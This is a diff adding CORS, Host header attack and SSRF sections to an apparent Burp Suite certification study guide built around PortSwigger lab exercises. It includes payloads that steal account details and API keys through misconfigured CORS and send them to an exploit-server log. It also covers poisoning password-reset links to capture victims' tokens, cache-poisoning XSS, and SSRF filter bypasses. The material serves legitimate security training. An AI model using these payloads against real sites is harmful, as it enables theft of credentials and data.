@@ -366,7 +366,7 @@ This guide provides a comprehensive flow for testing various types of HTTP reque
 What can you do with it?
 - smuggle a request through a normal request, which would be blocked under normal circumstances, that response will be queued and when you send any other request you will be served that responses
 - If there is a reflected XSS, then you can use the second request to be in the queue and the response will be served to a user who visits the website next, you can use fetch payload to get cookie
-- Again you can queue a response and if a user who has signed up will be served up their response, and their response which may contain cookie will be served up to you and then you can use that cookie, to sign in 
+- Again you can queue a response and if a user who has signed up will be served up their response, and their response which may contain cookie will be served up to you and then you can use that cookie, to sign in
 
 ## Flow Chart for Testing HTTP Request Smuggling
 
@@ -690,3 +690,297 @@ Unexpected responses using Burp Suite, server logs, and HTTP response analysis.
 ### 9. Confirm Exploitable Vulnerabilities
 
 Verify if the observed behavior can be exploited using various payloads to determine the extent of the vulnerability.
+
+
+## CORS
+
+CORS vulnerabilities can help you get cookies, access tokens, and other information etc.
+Try this on stage 1 or stage 2 of the exam.
+
+For testing for CORS misconfiguration check if CORS headers are returned or not and what do they say:
+
+Access-Control-Allow-Origin: <value>
+Access-Control-Allow-Credentials: <value true or false>
+
+Sometimes the orignin value will be just reflected in the Access control headers.
+
+Example Scenario:
+
+Send the request to Burp Repeater, and resubmit it with the added header:
+Origin: https://example.com
+Observe that the origin is reflected in the Access-Control-Allow-Origin header.
+
+Payload for lab to get access keys, once you know that credentials will be shared by the
+CORS
+
+```
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+```
+Similarly if null origin is reflected then you can get the user to navigate from top level navigation, code
+
+```
+
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>fetch(https://0ac6001b04623a9b86df3226003200e1.web-security-academy.net/accountDetails`, { credentials: 'include', method: 'GET' }).then(response=> response.json()).then(data => { fetch(/?apiKey=${data.apikey}, { mode: 'no-cors' }) }) </script>"></iframe>
+```
+
+Check if there is subdomain using tls or not which is vulnerable to XSS, and then see if you can try to retrieve information from there, payload example:
+```
+<script>document.location="http://stock.0a5900f103e3b1a680423a8c006c0004.web-security-academy.net/?productId=4<script>var+req=+new+XMLHttpRequest();req.onload=reqListener;req.open('get','https://0a5900f103e3b1a680423a8c006c0004.web-security-academy.net/accountDetails',true);req.withCredentials=true;req.send();function+reqListener()+{location='https://exploit-0ac300320399b1fa80e439d9018e002a.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>&storeId=1"
+</script>
+```
+
+## HTTP Host header attacks
+
+These types of attacks can be used to escalate privilege or try to bypass authentication, and can be used in stage1 or stage2 of the exam.
+
+Most of these findings are found through auotmatic scanner, then you will need to work on exploit, the details will be like External Service Interaction(HTTP), Out of Band resource load(HTTP).
+
+## Approach
+The best place, where you can set this type of attacks is in **Forgot password?** functionality.  
+![image](https://user-images.githubusercontent.com/58632878/225040952-cf621879-c6e9-4b9d-aac8-b1b3c3d95bf4.png)  
+
+Set your exploit server in Host and change username to victim's one:  
+![image](https://user-images.githubusercontent.com/58632878/225041836-87faa37d-39f9-48c5-910f-aed9be30f63a.png)  
+
+Go to exploit server logs and find victim's forgot-password-token:  
+![image](https://user-images.githubusercontent.com/58632878/225043063-d2db3e7a-f23d-40cb-955e-76e282be65f1.png)  
+
+These Headers can also be used, when **Host** does not work:
+```
+X-Forwarded-Host: exploit-server.com
+X-Host: exploit-server.com
+X-Forwarded-Server: exploit-server.com
+```
+## Techniques where host header can be injected:
+### Duplicate Headers
+
+```
+Host: vulnerable-website.com
+Host: bad-stuff-here
+```
+
+### Supply absolute URL
+
+```
+GET https://vulnerable-website.com/ HTTP/1.1
+Host: bad-stuff-here
+```
+
+### Adding a line wrapper
+
+```
+GET /example HTTP/1.1
+    Host: bad-stuff-here
+Host: vulnerable-website.com
+```
+
+### Inject host override headers
+
+Example:
+```
+GET /example HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-Host: bad-stuff-here
+```
+Other such header are:
+```
+
+    X-Host
+    X-Forwarded-Server
+    X-HTTP-Host-Override
+    Forwarded
+```
+
+## Labs
+### 1. To send malicious email put your server in Host
+```
+Host: exploit-server.com
+```
+>https://hackerone.com/reports/698416
+
+### 2. Admin panel from localhost only
+```
+GET /admin HTTP/1.1
+Host: localhost
+```
+
+### 3. Double Host / Cache poisoning
+```
+Host: 0adf00cc033d5f09c05b077d000200eb.web-security-academy.net
+Host: "></script><script>alert(document.cookie)</script>
+```
+>https://hackerone.com/reports/123513
+
+### 4. SSRF
+```
+GET /admin HTTP/1.1
+Host: 192.168.0.170
+```
+
+### 5. SSRF
+```
+GET https://0a44007e03fb1d0cc0068900005000d1.web-security-academy.net HTTP/1.1
+Host: 192.168.0.170
+```
+
+### 6. Dangling markup
+```
+Host: 0a42005f03d221bec0c45997001600ce.web-security-academy.net:'<a href="http://burp-collaborator.com?
+```
+>https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
+"
+
+### 7. Sequential testing
+
+
+Send the GET / request to Burp Repeater.
+
+Make the following adjustments:
+
+    Change the path to /admin.
+
+    Change Host header to 192.168.0.1.
+
+Send the request. Observe that you are simply redirected to the homepage.
+
+Duplicate the tab, then add both tabs to a new group.
+
+Select the first tab and make the following adjustments:
+
+    Change the path back to /.
+
+    Change the Host header back to YOUR-LAB-ID.h1-web-security-academy.net.
+
+Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
+
+Change the Connection header to keep-alive.
+
+Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel.
+
+## Server-side request forgery (SSRF)
+## Approach
+One of my favorites, quite easy to understand.  
+**ATTENTION:** If you find an SSRF vulnerability on exam, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.  
+
+In addition to lab cases, I've got some other useful techniques about this type:  
+SSRF Bypass:
+```
+▶️Type in http://2130706433 instead of http://127.0.0.1
+▶️Hex Encoding 127.0.0.1 translates to 0x7f.0x0.0x0.0x1
+▶️Octal Encoding 127.0.0.1 translates to 0177.0.0.01
+▶️Mixed Encoding 127.0.0.1 translates to 0177.0.0.0x1
+
+https://h.43z.one/ipconverter/
+```
+![image](https://user-images.githubusercontent.com/58632878/224699478-48309584-4c49-4c06-9714-5d19a245df72.png)  
+
+>**Like XML, the place to find SSRF is at /product/stock check.**  
+
+![da](https://user-images.githubusercontent.com/58632878/224700641-25eaaaea-c69c-48ca-8d5a-92c2d197963a.png)  
+
+>**There is also another place for SSRF, but it will be covered in [HTTP Host header attacks](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-host-header-attacks).**
+
+## Labs
+### 1. Basic SSRF against another back-end system
+>Need to scan internal network to find IP with 8080 port:
+```
+stockApi=http://192.168.0.34:8080/admin
+```
+
+### 2. SSRF with blacklist-based input filter
+```
+stockApi=http://127.1/AdMiN/
+```
+
+### 3. SSRF with filter bypass via open redirection vulnerability
+```
+stockApi=/product/nextProduct?currentProductId=2%26path%3dhttp://192.168.0.12:8080/admin
+```
+
+### 4. Blind SSRF with out-of-band detection
+```
+Referer: http://burpcollaborator
+```
+
+### 5. SSRF with whitelist-based input filter
+```
+stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/
+```
+
+### 6. Admin panel - Download report as PDF SSRF  
+![image](https://user-images.githubusercontent.com/58632878/225074847-8daa2242-a99d-423f-888e-111755f04d9c.png)  
+```
+<iframe src='http://localhost:6566/secret' height='500' width='500'>
+```
+>https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/  
+
+
+**Get access to any user**  
+[XSS](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#xss)  
+[DOM-based vulnerabilities](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#dom-based-vulnerabilities)  
+[Authentication](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#authentication)  
+[Web cache poisoning](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#web-cache-poisoning)  
+[HTTP Host header attacks](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-host-header-attacks)  
+[HTTP request smuggling](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-request-smuggling)  
+
+
+**Promote yourself to an administrator or steal his data**  
+[SQL Injection](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#sql-injection)  
+[Cross-site request forgery (CSRF)](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#cross-site-request-forgery-csrf)  
+[Insecure deserialization](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#insecure-deserialization) (Modifying serialized data types)  
+[OAuth authentication](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#oauth-authentication)  
+[JWT](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#jwt)  
+[Access control vulnerabilities](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#access-control-vulnerabilities)  
+
+
+**Read the content of /home/carlos/secret**  
+[Server-side request forgery (SSRF)](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#server-side-request-forgery-ssrf)  
+[XML external entity (XXE) injection](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#xml-external-entity-xxe-injection)  
+[OS command injection](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#os-command-injection)  
+[Server-side template injection](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#server-side-template-injection)  
+[Directory traversal](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#directory-traversal)  
+[Insecure deserialization](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#insecure-deserialization)  
+[File upload vulnerabilities](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#file-upload-vulnerabilities)  
+
+
+**Misc**  
+[Cross-origin resource sharing (CORS) + Information disclosure](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#cross-origin-resource-sharing-cors--information-disclosure)  
+[WebSockets](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#websockets)  
+[Prototype pollution](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#prototype-pollution)  
+
+
+**Possible Vulnerabilities**   
+Kudos to https://github.com/botesjuan/ for this awesome image, that defines possible vulnerabilities on exam.  
+![image](https://user-images.githubusercontent.com/58632878/225064808-72de66b7-ef3a-4915-a9bf-d253d7f981f6.png)  
+
+**Stage 1**  
+[Host Header Poison](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-host-header-attacks)  
+[Web cache poisoning](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#web-cache-poisoning)  
+[Password reset function](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#3-password-reset-broken-logic)  
+[HTTP request smuggling](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-request-smuggling)  
+[XSS](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#xss)  
+
+**Stage 2**  
+[JSON RoleID](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#1-user-role-can-be-modified-in-user-profile)  
+[SQL Injection](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#sql-injection)  
+[CSRF Refresh Password isloggedin true](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#10-csrf-refresh-password-isloggedin-true)  
+[JWT](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#jwt)  
+
+**Stage 3**  
+[Admin user import via XML](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-user-import-via-xml)  
+[Path Traversal](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#directory-traversal)  
+[Admin panel - Download report as PDF SSRF](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel---download-report-as-pdf-ssrf)  
+[Admin panel - RFI](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-rfi)  
+[Admin panel - SSTI](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-password-reset-email-ssti)  
+[Admin panel - ImgSize](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner/#5-admin-panel-imgsize-command-injection)  
